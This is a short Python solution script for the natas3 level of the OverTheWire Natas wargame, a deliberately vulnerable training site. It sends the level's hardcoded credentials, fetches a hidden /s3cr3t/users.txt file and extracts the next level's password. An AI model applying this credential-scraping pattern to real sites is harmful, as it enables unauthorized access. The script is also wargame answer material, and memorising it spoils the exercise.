import re
import requests
user = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
url = 'http://{}.natas.labs.overthewire.org/s3cr3t/users.txt'.format(user)
r = requests.get(url, auth=(user, password)).text
print(re.findall('natas4:(.*)', r)[0])